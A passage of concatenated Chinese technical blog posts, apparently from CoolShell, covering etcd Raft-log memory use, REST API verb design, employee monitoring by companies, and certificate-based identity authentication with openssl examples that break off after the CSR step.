
**首当其冲是——RaftLog**。etcd用Raft Log，主要是用于帮助follower同步数据，这个log的底层实现不是文件，而是内存。所以，而且还至少要保留 `5000` 条最新的请求。如果key的size很大，这 `5000`条就会产生大量的内存开销。比如，不断更新一个 1M的key，哪怕是同一个key，这 5000 条Log就是 5000MB = 5GB 的内存开销。这个问题在etcd的issue列表中也有人提到过 [issue #12548 ](https://github.com/etcd-io/etcd/issues/12548)，不过，这个问题不了了之了。这个5000还是一个hardcode，无法改。（参看 `DefaultSnapshotCatchUpEntries` [相关源码](https://github.com/etcd-io/etcd/blob/29c3b0f307107fd95a6eb43ddff20db952eeb2fa/server/etcdserver/server.go#L80)）

```
// DefaultSnapshotCatchUpEntries is the number of entries for a slow follower
// to catch-up after compacting the raft storage entries.
// We expect the follower has a millisecond level latency with the leader.
// The max throughput is around 10K. Keep a 5K entries is enough for helping
// follower to catch up.
DefaultSnapshotCatchUpEntries uint64 = 5000
```

另外，我们还发现，这个设计在历史上etcd的官方团队把这个默认值从10000降到了5000，我们估计etcd官方团队也意识到10000有点太耗内存了，所以，降了一半，但是又怕follwer同步不上，所以，保留了 5000条……（在这里，我个人感觉还有更好的方法，至少不用全放在内存里吧……）

另外还有下面几项也会导致etcd的内存会增加

1. **索引**。etcd的每一对 key-value 都会在内存中有一个 B-tree 索引。这个索引的开销跟key的长度有关，etcd还会保存版本。所以B-tree的内存跟key的长度以及历史版本号数量也有关系。
2. **mmap**。还有，etcd 使用 mmap 这样上古的unix技术做文件映射，会把他的blotdb的内存map到虚拟内存中，所以，db-size越大，内存越大。
3. **Watcher**。watch也会占用很大的内存，如果watch很多，连接数多，都会堆积内存。

（很明显，etcd这么做就是为了一个高性能的考虑）

Easegress中的问题更多的应该是Raft Log 的问题。后面三种问题我们觉得不会是用户这个问题的原因，对于索引和mmap，使用 [etcd 的 compact 和 defreg](https://etcd.io/docs/v3.2/op-guide/maintenance/) （压缩和碎片整理应该可以降低内存，但用户那边不应该是这个问题的核心原因）。

针对用户的问题，大约有1000多条pipeline，因为Easegress会对每一条pipeline进行数据统计（如：M1, M5, M15， P99, P90, P50等这样的统计数据），统计信息可能会有1KB-2KB左右，但Easegress会把这1000条pipeline的统计数据合并起来写到一个key中，这1000多条的统计数据合并后会导致出现一个平均尺寸为2MB的key，而5000个in-memory的RaftLog导致etcd要消耗了10GB的内存。之前没有这么多的pipeline的场景，所以，这个内存问题没有暴露出来。

于是，我们最终的解决方案也很简单，我们修改我们的策略，不再写这么大的Value的数据了，虽然以前只写在一个key上，但是Key的值太大，现在把这个大Key值拆分成多个小的key来写，这样，实际保存的数据没有发生变化，但是RaftLog的每条数据量就小了，所以，以前是5000条 2M（10GB），现在是5000条 1K（500MB），就这样解决了这个问题。相关的PR在这里 [PR#542](https://github.com/megaease/easegress/pull/542) 。

#### 总结

要用好 etcd，有如下的实践

- 避免大尺寸的key和value，一方面会通过一个内存级的 Raft Log 占大量内存，另一方面，B-tree的多版本索引也会因为这样耗内存。
- 避免DB的尺寸太大，并通过 compact和defreg来压缩和碎片整理降低内存。
- 避免大量的Watch Client 和 Watch数。这个开销也是比较大的。
- 最后还有一个，就是尽可能使用新的版本，无论是go语言还是etcd，这样会少很多内存问题。比如：golang的这个跟LInux内核心相关的[内存问题](https://github.com/golang/go/issues/42330) —— golang 1.12的版sget的是 `MADV_FREE` 的内存回收机制，而在1.16的时候，改成了 `MADV_DONTNEED` ，这两者的差别是，`FREE`表示，虽然进程标记内存不要了，但是操作系统会保留之，直到需要更多的内存，而 `DONTNEED` 则是立马回收，你可以看到，在常驻内存RSS 上，前者虽然在golang的进程上回收了内存，但是RSS值不变，而后者会看到RSS直立马变化。Linux下对 `MADV_FREE` 的实现在某些情况下有一定的问题，所以，在go 1.16的时候，默认值改成了 `MADV_DONTNEED` 。而 etcd 3.4 是用 来1.12 编译的。

最后，欢迎大家关注我们的开源软件！ [https://github.com/megaease/ ](https://github.com/megaease/)

（全文完）

# “一把梭：REST API 全用 POST”

#####  [2022年02月13日 ](https://coolshell.cn/articles/22173.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [119 条评论](https://coolshell.cn/articles/22173.html#comments) 94,831 人阅读

![img](photo/http_method-300x169.png)

写这篇文章的原因主要还是因为V2EX上的这个[贴子](https://www.v2ex.com/t/830030?p=1)，这个贴子中说——

> “对接同事的接口，他定义的所有接口都是 post 请求，理由是 https 用 post 更安全，之前习惯使用 restful api ，如果说 https 只有 post 请求是安全的话？那为啥还需要 get 、put 、delete ？我该如何反驳他。”

然后该贴中大量的回复大概有这么几种论调，1）POST挺好的，就应该这么干，沟通少，2）一把梭，早点干完早点回家，3）吵赢了又怎么样？工作而已，优雅不能当饭吃。虽然评论没有一边倒，但是也有大量的人支持。然后，我在Twitter上嘲讽了一下，用POST干一切就像看到了来你家装修工人说，“老子干活就是用钉子钉一切，什么螺丝、螺栓、卡扣、插销……通通不用，钉枪一把梭，方便，快捷，安全，干完早回家……不过，还是有一些网友觉得用POST挺好的，而且可以节约时间。所以，正好，我在《[我做系统架构的原则](https://coolshell.cn/articles/21672.html)》中的“[原则五](https://coolshell.cn/articles/21672.html#原则五：制定并遵循服从标准、规范和最佳实践)”中反对API返回码无论对错全是200的返回那，我专门写下这一篇文章，以正视听。

这篇文章主要分成下面这几个部分：

1. 为什么要用不同的HTTP动词？
2. Restful 进行复杂查询
3. 几个主要问题的回应
   - POST 更安全吗？
   - 全用 POST 可以节省时间沟通少吗？
   - 早点回家的正确姿势
   - 工作而已，优雅不能当饭吃



目录



[为什么要用不同的HTTP动词](https://coolshell.cn/articles/22173.html#为什么要用不同的HTTP动词)[Restful 复杂查询](https://coolshell.cn/articles/22173.html#Restful_复杂查询)[几个主要问题的回应](https://coolshell.cn/articles/22173.html#几个主要问题的回应)[1）为什么API 要Restful，并符合规范？](https://coolshell.cn/articles/22173.html#1）为什么API_要Restful，并符合规范？)[2）为什么“过早优化”不适用于API设计？](https://coolshell.cn/articles/22173.html#2）为什么“过早优化”不适用于API设计？)[3）POST 更安全吗？](https://coolshell.cn/articles/22173.html#3）POST_更安全吗？)[4）全用 POST 可以节省时间减少沟通吗？](https://coolshell.cn/articles/22173.html#4）全用_POST_可以节省时间减少沟通吗？)[5）早点回家的正确姿势](https://coolshell.cn/articles/22173.html#5）早点回家的正确姿势)[6）工作而已，优雅不能当饭吃](https://coolshell.cn/articles/22173.html#6）工作而已，优雅不能当饭吃)

#### 为什么要用不同的HTTP动词

编程世界通常来说有两种逻辑：“**业务逻辑**” 和 “**控制逻辑**”。

- **业务逻辑**。就是你实现业务需求的功能的代码，就是跟用户需求强相关的代码。比如，把用户提交的数据保存起来，查询用户的数据，完成一个订单交易，为用户退款……等等，这些是业务逻辑
- **控制逻辑**。就是我们用于控制程序运行的非功能性的代码。比如，用于控制程序循环的变量和条件，使用多线程或分布式的技术，使用HTTP/TCP协议，使用什么样数据库，什么样的中间件……等等，这些跟用户需求完全没关系的东西。

网络协议也是一样的，一般来说，**几乎所有的主流网络协议都有两个部分，一个是协议头，一个是协议体。协议头中是协议自己要用的数据，协议体才是用户的数据。所以，协议头主要是用于协议的控制逻辑，而协议体则是业务逻辑。**

HTTP的动词（或是Method）是在协议头中，所以，其主要用于控制逻辑。

下面是HTTP的动词规范，一般来说，REST API 需要开发人员严格遵循下面的标准规范（参看[RFC7231 章节4.2.2 – Idempotent Methods](https://www.rfc-editor.org/rfc/rfc7231#section-4.2.2)）

| 方法    | 描述                                                    | 幂等 |
| :------ | :------------------------------------------------------ | :--- |
| GET     | 用于查询操作，对应于数据库的 `select` 操作              | ✔︎    |
| PUT     | 用于所有的信息更新，对应于数据库的 `update `操作        | ✔︎︎    |
| DELETE  | 用于更新操作，对应于数据库的 `delete` 操作              | ✔︎︎    |
| POST    | 用于新增操作，对应于数据库的 `insert` 操作              | ✘    |
| HEAD    | 用于返回一个资源对象的“元数据”，或是用于探测API是否健康 | ✔︎    |
| PATCH   | 用于局部信息的更新，对应于数据库的 `update` 操作        | ✘    |
| OPTIONS | 获取API的相关的信息。                                   | ✔︎    |

其中，`PUT` 和 `PACTH` 都是更新业务资源信息，如果资源对象不存在则可以新建一个，但他们两者的区别是，`PUT` 用于更新一个业务对象的所有完整信息，就像是我们通过表单提交所有的数据，而 `PACTH` 则对更为API化的数据更新操作，只需要更需要更新的字段（参看 [RFC 5789](http://tools.ietf.org/html/rfc5789) ）。

当然，现实世界中，可能并不一定严格地按照数据库操作的CRUD来理解API，比如，你有一个登录的API `/login` 你觉得这个API应该是 `GET` ，`POST`，`PUT` 还是 `PATCH` ?登录的时候用户需要输入用户名和密码，然后跟数据库里的对比（select操作）后反回一个登录的session token，然后这个token作为用户登录的状态令牌。如果按上面表格来说，应该是 select 操作进行 `GET` ，但是从语义上来说，登录并不是查询信息，应该是用户状态的更新或是新增操作（新增session），所以还是应该使用 `POST`，而 `/logout` 你可以使用 `DELETE` 。**这里相说明一下，不要机械地通过数据库的CRUD来对应这些动词，很多时候，还是要分析一下业务语义。**

**另外，我们注意到，在这个表格的最后一列中加入了“是否幂等”的，API的幂等对于控制逻辑来说是一件很重要的事。**所谓幂等，就是该API执行多次和执行一次的结果是完全一样的，没有副作用。

- `POST` 用于新增加数据，比如，新增一个交易订单，这肯定不能是幂等的
- `DELETE` 用于删除数据，一个数据删除多次和删除一次的结果是一样的，所以，是幂等的
- `PUT` 用于全部数更新，所以，是幂等的。
- `PATCH`用于局部更新，比如，更新某个字段 cnt = cnt+1，明显不可能是幂等操作。

幂等这个特性对于远程调用是一件非常关键的事，就是说，远程调用有很多时候会因为网络原因导致调用timeout，对于timeout的请求，我们是无法知道服务端是否已经是收到请求并执行了，此时，我们不能贸然重试请求，对于不是幂等的调用来说，这会是灾难性的。比如像转帐这样的业务逻辑，转一次和转多次结果是不一样的，如果重新的话有可能就会多转了一次。所以，这个时候，如果你的API遵从了HTTP动词的规范，那么你写起程序来就可以明白在哪些动词下可以重试，而在哪些动词下不能重试。如果你把所有的API都用POST来表达的话，就完全失控了。

除了幂等这样的控制逻辑之外，你可能还会有如下的这些控制逻辑的需求：

- **缓存**。通过CDN或是网关对API进行缓存，很显然，我们要在查询`GET` 操作上建议缓存。
- **流控**。你可以通过HTTP的动词进行更粒度的流控，比如：限制API的请用频率，在读操作上和写操作上应该是不一样的。
- **路由**。比如：写请求路由到写服务上，读请求路由到读服务上。
- **权限**。可以获得更细粒度的权限控制和审计。
- **监控**。因为不同的方法的API的性能都不一样，所以，可以区分做性能分析。
- **压测**。当你需要压力测试API时，如果没有动词的区分的话，我相信你的压力测试很难搞吧。
- ……等等

也许，你会说，我的业务太简单了，没有必要搞这么复杂。OK，没有问题，但**是我觉得你最差的情况下，也是需要做到“读写分离”的，就是说，至少要有两个动词，`GET` 表示是读操作，`POST`表示是写操作。**

#### Restful 复杂查询

一般来说，对于查询类的API，主要就是要完成四种操作：排序，过滤，搜索，分页。下面是一些相关的规范。参考于两个我觉得写的最好的Restful API的规范文档，[Microsoft REST API Guidelines](https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md)，[Paypal API Design Guidelines](https://github.com/paypal/api-standards/blob/master/api-style-guide.md)。

- **排序**。对于结果集的排序，使用 `sort` 关键字，以及 `{field_name}|{asc|desc},{field_name}|{asc|desc}` 的相关语法。比如，某API需要返回公司的列表，并按照某些字段排序，如：`GET /admin/companies?sort=rank|asc` 或是 `GET /admin/companies?sort=rank|asc,zip_code|desc`

- **过滤**。对于结果集的过滤，使用 `filter` 关键字，以及 `{field_name} op{value}` 的语法。比如： `GET /companies?category=banking&location=china` 。但是，有些时候，我们需要更为灵活的表达式，我们就需要在URL上构造我们的表达式。这里需要定义六个比较操作：`=`，`<`，`>`，`<=`，`>=`，以及三个逻辑操作：`and`，`or`，`not`。（表达式中的一些特殊字符需要做一定的转义，比如：`>=` 转成 `ge`）于是，我们就会有如下的查询表达式：`GET /products?$filter=name eq 'Milk' and price lt 2.55` 查找所有的价柗小于2.55的牛奶。

- **搜索**。对于相关的搜索，使用 `search` 关键字，以及关键词。如：`GET /books/search?description=algorithm` 或是直接就是全文搜索 `GET /books/search?key=algorithm` 。

- **分页**。对于结果集进行分页处理，分页必需是一个默认行为，这样不会产生大量的返回数据。

  - 使用`page`和`per_page`代表页码和每页数据量，比如：`GET /books?page=3&per_page=20`。

  - 可选

    。上面提到的

    ```
    page
    ```

    方式为使用相对位置来获取数据，可能会存在两个问题：性能（大数据量）与数据偏差（高频更新）。此时可以使用绝对位置来获取数据：事先记录下当前已获取数据里最后一条数据的

    ```
    ID
    ```

    、

    ```
    时间
    ```

    等信息，以此获取 “

    该ID之前的数据

    ” 或 “

    该时刻之前的数据

    ”。示例：

    ```
    GET /news?max_id=23454345&per_page=20
    ```

     或 

    ```
    GET /news?published_before=2011-01-01T00:00:00Z&per_page=20
    ```

    。

    

**注意：这里需要注意一下，在理论上来说`GET`是可以带 body 的，但是很多程序的类库或是中间件并不支持 GET 带 body，导致你只能用 POST 来传递参数。这里的原则是：**

1. **对于简单的查询，很多参数都设计在 restful API 的路径上了，而 filter/sort/pagination 也不会带来很多的复杂，所以应该使用 `GET`** 
2. **对于复杂的查询来说，可能会有很复杂的查询参数，比如：ElasticSearch 上的 `index/_search`里的 DSL，你也应该尽可能的使用 `GET`，而不是`POST` 除非客观条件上不支持`GET`。ElasticSearch 的[官方文档](https://www.elastic.co/guide/en/elasticsearch/guide/current/_empty_search.html)里也是这么说的。**

> The authors of Elasticsearch prefer using GET for a search request because they feel that it describes the action—retrieving information—better than the POST verb. （我们推荐使用 GET而不是 POST，因为语义更清楚）However, because GET with a request body is not universally supported, the search API also accepts POST requests （除非你的类库或是服务器不支持 GET带参数 ，你再用POST，我们两个都支持）
>
> **陈皓注：但是在 ElasticSearch 7.11 后，GET 也不支持 body 了。这是 ElasticSearch 的设计和实现不对应了。**

另外，对于一些更为复杂的操作，建议通过分别调用多个API的方式来完成，虽然这样会增加网络请求的次数，但是这样的可以让后端程序和数据耦合度更小，更容易成为微服务的架构。

最后，如果你想在Rest中使用像GraphQL那样的查询语言，你可以考虑一下类似 [OData](https://www.odata.org/) 的解决方案。OData 是 Open Data Protocol 的缩写，最初由 Microsoft 于 2007 年开发。它是一种开放协议，使您能够以简单和标准的方式创建和使用可查询和可互操作的 RESTful API。

#### 几个主要问题的回应

下面是对几个问题的直接回应，如果大家需要我回应更多的问题，可以在后面留言，我会把问题和我的回应添加到下面。

##### 1）为什么API 要Restful，并符合规范？

**Restful API算是一个HTTP的规范和标准了，你要说是最佳实践也好，总之，它是一个全世界对HTTP API的一个共识。在这个共识上，你可以无成本地享受很多的技术红利，比如：CDN，API网关，服务治理，监控……等等。这些都是可以让你大幅度降低研发成本，避免踩坑的原因。**

##### 2）为什么“过早优化”不适用于API设计？

因为API是一种契约，一旦被使用上，就很难再变更了，就算你发行新的版本的API，你还要驱动各种调用方升级他们的调用方式。所以，接口设计就像数据库模式设计一下，一旦设计好了，未来再变更就比较难了。所以，还是要好好设计。正如前面我给的几个文档——[Microsoft REST API Guidelines](https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md)，[Paypal API Design Guidelines](https://github.com/paypal/api-standards/blob/master/api-style-guide.md) 或是 [Google API Design Guide](https://cloud.google.com/apis/design) 都是让你好好设计API的不错的 Guidelines.

##### 3）POST 更安全吗？

不会。

很多同学以为 `GET` 的请求数据在URL中，而 `POST` 的则不是，所以以为 `POST` 更安全。不是这样的，整个请求的HTTP URL PATH会全部封装在HTTP的协议头中。只要是HTTPS，就是安全的。当然，有些网关如nginx会把URL打到日志中，或是会放在浏览器的历史记录中，所以有人会说 `GET` 请求不安全，但是，`POST` 也没有好到哪里去，在 [CSRF](https://en.wikipedia.org/wiki/Cross-site_request_forgery) 这个最常见的安全问题上，则完全就是针对 `POST` 的。 安全是一件很复杂的事，无论你用哪方法或动词都会不能代表你会更安全。

另外，

- 如果你要 防止你的 `GET` 上有敏感信息，应该加个密，这个跟 `POST`是一样的。
- 如果你要防止 `GET` 会被中间人修改，你应该做一个URL签名。（通常来说， 我们都在 `GET` 上做签名，`POST` 就忘做了）
- 如果你要防止有人发一些恶意链接来 hack 你的用户（传说中的 `GET` 不如 `POST` 安全的一个问题），你应该用 HMAC 之类的认证技术做好认证（参看 [HTTP API 认证授权术](https://coolshell.cn/articles/19395.html)）。

总之，你要明白，`GET` 和 `POST` 的安全问题都一样的，不要有谁比谁更安全，然后你就可以掉以轻心的这样的想法，安全都是要很严肃对待的。

##### 4）全用 POST 可以节省时间减少沟通吗？

不但不会，反而更糟糕。

说这种话的人，我感觉是不会思考问题。

- 其一，为API赋于不同的动词，这个几乎不需要时间。把CRUD写在不同的函数下也是一种很好的编程风格。另外现在几乎所有的开发框架都支持很快速的CRUD的开发，比如Spring Boot，写数据库的CRUD基本上就不需要写SQL语言相关的查询代码，非常之方便。
- 其二，使用规范的方式，可以节约新加入团队人员的学习成本，而且可以大大减少跨团队的沟能成本。规范和标准其实就是在节约团队时间提升整体效率的，这个我们整个人类进行协作的基础。所以，这个世界上有很多的标准，你只要照着这个标准来，你的所生产的零件就可以适配到其它厂商的产品上。而不需要相互沟通。
- 其三，全用POST接口一把梭，不规范不标准，使用你的这个山寨API的人就得来不断的问你，反而增加了沟通。另外，也许你开发业务功能很快了，但是你在做控制逻辑的时候，你就要返工了，从长期上来讲，你的欠下了技术债，这个债反而导致了更大的成本。

##### 5）早点回家的正确姿势

不要以为你回家早就没事了，如果你的代码有这样那样的问题，别人看懂，或是出误用了你的代码出了问题，那么，你早回家有什么意义呢？你一样要被打扰，甚至被叫到公司来处理问题。所以，你应该做的是为了“长期的早回家”，而不是“短期的早回家”，要像长期的早回家，通常来说是这样的：

- **把代码组织设计好，有更好的扩展性**。这样在面对新需求的时候，你就可以做到少改代码，甚至不改代码。这样你才可能早回家。不然，每次需求一来，你得重新写，你怎么可能早回家？
- **你的代码质量是不错的，有不错的文档和注释**。所以，别人不会老有问题来找你，或是你下班后，叫你来处理问题。甚至任何人都可以很容易地接手你的代码，这样你才可能真正不被打扰

##### 6）工作而已，优雅不能当饭吃

回应两点：

其一，遵循个规范而已，把“正常”叫“优雅”，可见标准有多低。这么低的标准也只能“为了吃饭而生存了”。

其二，**作为一个“职业程序员”，要学会热爱和尊重自己的职业，热爱自己职业最重要的就是不要让外行人看扁这个职业，自己都不尊重这个职业，你让别人怎么尊重？尊重自己的职业，不仅仅只是能够获得让人羡慕的报酬，而更是要让自己的这个职业的更有含金量**。

**希望大家都能尊重自己从事的这个职业，成为真正的职业化的程序员，而不是一个码农！**

![img](photo/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75.jpeg)你的工作给你权力，而只有你的行为才会给你尊重

# 谈谈公司对员工的监控

#####  [2022年02月12日 ](https://coolshell.cn/articles/22157.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [26 条评论](https://coolshell.cn/articles/22157.html#comments) 57,787 人阅读

今天看到微博上有一个热点事件， 是一个关于某公司做的一个监控员工离职倾向的软件，从截图中可以看到员工访问招聘网站的次数，还有投递的简历以及搜索的关建词等等信息，通过这些信息分析员工的离职倾向。然后我发一个微博，说了一下，我以前工作过的公司无论外国公司还是中国公司都有这样的情况，收到一些人来问我相关的情况，所以，我想还是写篇文章详细地说一下，我对这种事情的看法。

[![img](photo/monitoring-1024x534.jpeg)](https://coolshell.cn/wp-content/uploads/2022/02/monitoring.jpeg)

本文分成下面个部分：

- 公司监控员工的技术手段有哪些？
- 为什么要监控员工？
- 外企和国企有什么不一样？
- 我对此事的看法



目录



[技术手段](https://coolshell.cn/articles/22157.html#技术手段)[公司监控的目的](https://coolshell.cn/articles/22157.html#公司监控的目的)[外企与国企不同之处](https://coolshell.cn/articles/22157.html#外企与国企不同之处)[我对此事的看法](https://coolshell.cn/articles/22157.html#我对此事的看法)

#### 技术手段

下面是我经历过的几个手段：

1）**通过网络嗅探的方式**。也就是说，你只要上了公司的网络，你个人设备上的通讯信息就可以被人以网络抓包+分析的方式进行分析。当然，这样的手段已经不怎么好用了，因为现在的网络基本上都是HTTPS加密的，网络嗅探的方式只能知道你访问了什么IP，对于其中的数据是没有办法知道的。

2）**通过使用公司提供的软硬件工具**。你使用公司的电子邮箱，浏览器（或是公司的代理服务器），通讯工具（包括语音电话），手机办公应用……等来处理你的个人事宜的时候，必然会被监控。这样，你只需要不要使用公司的软件来处理自己的私事就好了。

3）**通过安装一个监控程序**。这个是最可怕的了，因为无论你加不加密都没用了。一般来说，你不安装这个程序，你就没有办法连上网络，包括公司内网和外网。这个监控程序，会收集你电脑或手机上能够收集的到的所有的信息，比如，你的网络信息，按键操作，录屏，软件数据……等等。

4）**办公区监控**。我见过的还有使用摄像头，在会议室中安装声音和视频监控设备，对整个办公区内发生所有的事情进行监控。

**5）通过爬虫。**通过爬虫分析员工的社交平台上的各种言论，包括招聘网站。除了公司需要分布和自己相关的舆情，同样也开始监控员工的行为和价值观等。这已经不是监控隐私信息了……

#### 公司监控的目的

公司监控的目的最早就是为了防止自己公司内的数据和信息外泄，所以，他们害怕自己的员工访问了什么不合适的网站，或是下载了什么有恶意的软件，或是不小心发错了邮件。另外一些公司也会使用外包人员，所以，对于外部编制的人员更需要有信息泄漏防范的安全需求。当然，也害怕有一些商业间谍或是自己的员工被收买了窃取公司内部的敏感信息。尤其是对于一些本身就是做数据的公司，如我以前呆过的Thomson Reuters，这家公司主要是卖金融数据的，所以，对信息泄漏是非常注重的，其就是需要在员工的电脑上安装监控软件。

还有一些劳动密集型的工作，比如在Amazon里的仓库里工作的人，公司会监控员工的工作量，以此来评估员工的工作绩效。对于用监控软件来评估程序员的工作量，我到今天仅见过监控外包人员的，在中国，外包人员需要使用甲方的电脑进行签到和签退，以及相关的工作。除了上述的信息安全目前，还能够看到员工的工作时长的情况。

**所以，一般来说，公司监控的目的主要是为了自己的信息安全，还有员工的工作量评估，一般来说，不会涉及员工的隐私**。

但是，随着收集的数据越来越多，有些公司发现还可以做更多的事，比如，上述的员工离职倾向的分析。**还有一些公司还会收集员工在外网的数据，比如你在社交平台上的各种言论，来分析你对公司的忠诚度和你的价值观取向……**我个人觉得这些已经令人不耻了。

#### 外企与国企不同之处

我经历过的公司中，外国公司和中国公司都有监控的经历，这里说一下他们的不一样之处。**最大的不一样的地方是，外国公司会让你有知情权，而中国公司则完全没有**。

我记得我进入Thomson Reuters 公司的时候，公司要求签署一份监控的知情的同意书，其中用中英文写的，就是说，你授权公司监控你的如下这些信息：1）上网记录，2）下载的软件，3）工作电脑，4）公司的座机电话，5）会议室和办公区的语音和视频监控……大概有两页A4纸，然后也说明了这些数据公司仅用于信息安全的风控，不用于个人隐私分析等等……并且会符合法律要求保护员工的这些数据不外泄……这些条款都经得起法律的推敲。这样的协议是需要员工签字的，并且对双方都有法律约束的。

中国的公司则不会告诉你他们会监控你哪些数据，而这些数据拿来做什么。 我记得我在某公司工作的时候，就有员工发现自己访问自己的gmail的录屏被公司收集后的愤怒……

#### 我对此事的看法

一方面，我对于公司通过使用监控软件监控员工的行为我是能够理解的，但是，**应该让员工有知情权，并和员工明确一个监控的信息和范围，包括收集的数据的用途和安全措施，以及数据多长时间销毁的协议。**如果没有这个协议的话，我觉得本质上就是一种流氓行为。

另一方面，针对监控员离职的倾向来说，我实在不知道有什么意义？公司你知道了又能如何呢？你是要找员工作思想工作，还是要给员工更好的待遇，还是直接开掉？**如果你对自己的企业有信心，你就不必担心员工会离开，如果你的企业有问题，你为什么不把心思花在建设自己的企业上来呢？安装这样的监控软件对于企业没有什么帮助，反而只会让你的企业的形象更low……**

再仔细想想，**员工有一万种方法泄漏你公司的信息，无论你怎么监控，只要他想，他总是能够找到方法的，不是么？如何让找到或是培养有职业操守的员工，如何管理自己企业的商业信息，如何建立一个更好的企业文化让员工更有归属感，成为企业的共同体，一同维护共同利益，为企业着想，这不才是公司真正应该干的事吗？！**监控员工充分暴露了这样的企业没有一个好的企业文化，不懂得高级的管理，所以，只能靠监控这样的手段来管理企业了……这样的企业不去也罢了。

（全文完）

# 网络数字身份认证术

#####  [2022年01月02日 ](https://coolshell.cn/articles/21708.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [14 条评论](https://coolshell.cn/articles/21708.html#comments) 33,044 人阅读

![img](photo/iStock-1175502114-300x201.png)这篇文章是《[HTTP API 认证授权术](https://coolshell.cn/articles/19395.html)》的姊妹篇，在那篇文章中，主要介绍了 HTTP API 认证和授权技术中用到的 HTTP Basic, Digest Access, HMAC, OAuth, JWT 等各种方式，主要是 API 上用到的一些技术，这篇文章主要想说的是另一个话题——身份认证。也就是说，怎么确认这个数据就是这个人发出来的？

目录



[用户密码](https://coolshell.cn/articles/21708.html#用户密码)[密钥对和证书](https://coolshell.cn/articles/21708.html#密钥对和证书)[证书生成过程演示](https://coolshell.cn/articles/21708.html#证书生成过程演示)[双向认证 mTLS](https://coolshell.cn/articles/21708.html#双向认证_mTLS)

#### 用户密码

要解决这个问题，我们先来看一个最简单的解——使用密码，通常来说，在网络上要证明一个人的身份的话，都需要这个人的一些私密而唯一的东西。比如，像密码这样的东西，很多地方，只要你提供了你的用户名+密码，就可以确定这个人是你（注明：关于密码管理，强密码设定，密码泄漏，密码破解以及密码哄骗不在这篇文章的话题中），也就是说，这个密码是非常私密的事，我们可以假设，这个事全世界只能有当事人一个人知道，所以，当事人得供正确的密码，我们就可以认证这个人了。

为了加强密码的安全程度，一般会使用 2FA（Two-factor authentication）或 MFA（Multi-factor authentication），双因认证或多因认证，这需要用户提供一个唯一的可信设备，比如用户的手机，然后通过验证手机短信，或是像 [Google Authenticator](https://en.wikipedia.org/wiki/Google_Authenticator) 这样的动态口令来完成。这样的安全级别已经算是比较高了。如果能够再加上经常性的变更密码，那么安全级别就更好了。



另外，一些公司还使用了生物密码来进行用户的身份验证，比如人脸识别。但是，我个人觉得人脸识别或是生物识别是比较糟糕的方式，因为：

- 目前能被验证的生物信息（如人脸和指纹）太容易被别人获得和伪造了。
- 这样东西不能被变更和吊销，密码可以被吊销和重置，人脸则不能。

#### 密钥对和证书

密码可以解决身证认证的问题有很多问题，最重要的一个问题就是，你要把你的密码提供给对方，对方才能验证你的身份。你不可能把你的密码提供给全世界的人吧，这样的话，全世界的人都有你的密码了，那么任何人都能变成你了。所以，用户密码这个事只能存在于权威机构和普通用户之间，不能存在于普遍应用中。所以，这里需要使用更好的解决方案。

使用 ECC（[Elliptic-Curve Cryptography](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography)）椭圆曲线密码术，可以通过一个“密钥对”进行非对称加密。这种技术，在对信息进行加密和解密时，使用两个不同的密钥，其中一个用来做加密，另一个做解密。这样一来，我们就可以把其中一个密钥公布出去，称之为公钥，另一个密钥私密地保管好，称之为私钥。

比如，我用我的私钥加密信息，然后，我把这个私钥所配对的公钥发布给所有人，大家都用公钥解密信息，不用我的公钥你解密不了这个信息。这样一来，就可以保证这个信息是我发出来的，不但保证了信息安全，还完成了身份认证。

![img](photo/key.pair_-1024x390.png)

这样的现实案例一般用于网站，也就是用户得要知道我访问的这个网站是真实的，不是别人做的。因为 DNS 很容易被 hack，你连上一个不可信的网络，这个网络里的 DNS 把这个网站的 IP 地址解析成什么 就是什么了。但是有了这个加密的机制后，网站把自己的信息加密后连同公钥给到访问者，访问解密后就知道是不是这个网站了。

但是，这里还是会有一个很严重的问题，那就是中间人攻击。如下图所示：

![img](photo/middle.man_-e1641105543137.png)

中间人 Chad 把自己伪装成 Bob 向 Alice 要信息，然后，再伪装成 Alice 对 Bob 说，这就是 Alice 的公钥，于是 Bob 也无法验证是不是 Alice 的公钥，因为公钥里就是一堆乱七八糟的数据，我们完全不能分辨哪个公钥属于 Alice 的。试想，如果我们收到声称属于银行的密钥。我们怎么知道它确实属于你的银行？

这里的答案就是**使用数字证书**。证书跟我们的身份证非常类似，其需要一个可信机构来颁发和验证的。这个证书机构 CA（Certificate Authority）是一个是大家都相信的权威机构，他用他的人品保证（当然一般会被严格管理和审计），CA 机构同样使用这样的非对称加密的技术来完成颁发和验证的事。下图展示了这一过程。

![img](photo/certificate-1024x532.png)

说明一下上面这个图：

1. 为了解决公钥认证的问题的，我们需要一个权威的CA 机构。
2. Alice 把自己的信息（姓名、组织，地址，电邮，网址等）和自己的公钥打包成一个 CSR 的文件，发给 CA 机构，
3. CA 机构会来找 Alice 做物理世界的认证，如果通过后，就会用自己的机构私钥，把CSR 变成一个签名证书。
4. Bob 同学拿到 Alice 的证书，用 CA 机构的公钥解密后，得到 Alice 的公钥
5. 后面就可以签证 信息是否来自 Alice 了。

是的，这个过程就是在“套娃”，这种证书机构还可以给下级的证书机构发证，于是就会一层套一层地，形成一个证书链，顶层的叫根证书，你得绝对信任之。对于验证证书真实性的客户端，它需要能够验证链中所有 CA 的签名，这意味着客户端需要访问链中所有 CA 的证书。

#### 证书生成过程演示

并不是所有的场景都需要向这些大型的 CA 机构申请公钥证书，在任何一个企业，组织或是团体内都可以自己形这样的“小王国”，也就是说，你可以自行生成这样的证书，只需要你自己保证自己的生成证书的私钥的安全，以及不需要扩散到整个互联网。下面，我们用 `openssl`命令来演示这个过程。

1）生成 CA 的证书（公钥） `ca.crt` 和私钥 `ca.key`

```
openssl req -newkey rsa:2048 \
    -new -nodes -x509 \
    -days 365 \
    -out ca.crt \
    -keyout ca.key \
    -subj "/C=SO/ST=Earth/L=Mountain/O=CoolShell/OU=HQ/CN=localhost"
```

2) 生成 alice 的私钥

```
openssl genrsa -out alice.key 2048
```

3）生成 Alice 的 CSR – Certificate Signing Request

```
openssl req -new -key alice.key 365 -out alice.csr \
    -subj "/C=CN/ST=Beijing/L=Haidian/O=CoolShell/OU=Test/CN=localhost.alice"
```
